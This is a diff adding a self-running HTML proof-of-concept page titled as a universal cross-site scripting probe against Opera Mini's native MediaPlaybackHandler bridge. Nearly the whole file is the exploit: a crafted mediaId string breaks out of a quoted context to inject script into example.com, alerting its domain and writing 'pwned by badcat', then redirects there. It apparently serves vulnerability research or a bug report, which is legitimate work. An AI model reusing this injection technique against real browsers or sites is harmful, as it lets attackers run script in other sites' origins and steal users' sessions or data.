@@ -1,0 +1,34 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Opera Mini media callback UXSS probe (auto)</title>
+<style>body{font:22px system-ui;padding:28px}pre{white-space:pre-wrap}</style>
+<h1>Media callback test (auto-run)</h1>
+<pre id="status"></pre>
+<script>
+const status = document.querySelector('#status');
+const say = s => status.textContent += s + '\n';
+
+function probe() {
+  say('origin=' + location.origin);
+  say('MediaPlaybackHandler=' + typeof window.MediaPlaybackHandler);
+  if (!window.MediaPlaybackHandler || typeof MediaPlaybackHandler.download !== 'function') {
+    say('Bridge unavailable in this renderer');
+    return;
+  }
+  const mediaId = "');if(location.hostname==='example.com')alert(document.domain);document.write('pwned by badcat')//";
+  const mediaUrl = new URL('uxss-probe.mp4', location.href).href;
+  try {
+    MediaPlaybackHandler.download([mediaUrl], mediaId, true);
+    say('Native download action requested.');
+  } catch (e) {
+    say('download() threw: ' + e);
+    return;
+  }
+  setTimeout(() => {
+    location.replace('https://example.com/');
+  }, 1000);
+}
+
+if (document.readyState === 'complete') setTimeout(probe, 0);
+else window.addEventListener('load', () => setTimeout(probe, 0));
+</script>
